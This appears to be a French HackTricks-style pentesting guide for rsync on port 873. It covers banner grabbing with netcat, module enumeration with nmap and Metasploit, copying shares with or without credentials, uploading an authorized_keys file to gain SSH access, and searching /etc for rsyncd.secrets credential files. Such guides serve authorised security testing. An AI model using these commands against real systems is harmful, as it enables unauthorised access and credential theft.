# 873 - Pentesting Rsync

{{#include ../banners/hacktricks-training.md}}

## **Informations de base**

De [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** est un utilitaire pour transférer efficacement [des fichiers](https://en.wikipedia.org/wiki/Computer_file) et [synchroniser](https://en.wikipedia.org/wiki/File_synchronization) [des fichiers](https://en.wikipedia.org/wiki/Computer_file) entre un ordinateur et un disque dur externe et à travers [des ordinateurs](https://en.wikipedia.org/wiki/Computer) [réseau](https://en.wikipedia.org/wiki/Computer_network) en comparant les [temps de modification](<https://en.wikipedia.org/wiki/Timestamping_(computing)>) et les tailles des fichiers.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) Il est couramment trouvé sur des [systèmes d'exploitation](https://en.wikipedia.org/wiki/Operating_system) [de type Unix](https://en.wikipedia.org/wiki/Unix-like). L'algorithme rsync est un type de [delta encoding](https://en.wikipedia.org/wiki/Delta_encoding), et est utilisé pour minimiser l'utilisation du réseau. [Zlib](https://en.wikipedia.org/wiki/Zlib) peut être utilisé pour une [compression de données](https://en.wikipedia.org/wiki/Data_compression) supplémentaire,[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) et [SSH](https://en.wikipedia.org/wiki/Secure_Shell) ou [stunnel](https://en.wikipedia.org/wiki/Stunnel) peuvent être utilisés pour la sécurité.

**Port par défaut :** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Énumération

### Bannière et communication manuelle
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Énumération des Dossiers Partagés**

Les **modules Rsync** sont reconnus comme des **partages de répertoires** qui peuvent être **protégés par des mots de passe**. Pour identifier les modules disponibles et vérifier s'ils nécessitent des mots de passe, les commandes suivantes sont utilisées :
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Soyez conscient que certaines partages pourraient ne pas apparaître dans la liste, les cachant éventuellement. De plus, l'accès à certains partages pourrait être restreint à des **identifiants** spécifiques, indiqué par un message **"Accès Refusé"**.

### [**Brute Force**](../generic-hacking/brute-force.md#rsync)

### Utilisation Manuelle de Rsync

Après avoir obtenu une **liste de modules**, les actions dépendent de la nécessité d'authentification. Sans authentification, **lister** et **copier** des fichiers d'un dossier partagé vers un répertoire local se fait par :
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Ce processus **transfère des fichiers de manière récursive**, préservant leurs attributs et permissions.

Avec **des identifiants**, l'énumération et le téléchargement depuis un dossier partagé peuvent être effectués comme suit, où une invite de mot de passe apparaîtra :
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Pour **télécharger du contenu**, tel qu'un fichier _**authorized_keys**_ pour l'accès, utilisez :
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Pour localiser le fichier de configuration rsyncd, exécutez :
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
Dans ce fichier, un paramètre _secrets file_ pourrait pointer vers un fichier contenant **noms d'utilisateur et mots de passe** pour l'authentification rsyncd.

## Références

- [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

{{#include ../banners/hacktricks-training.md}}
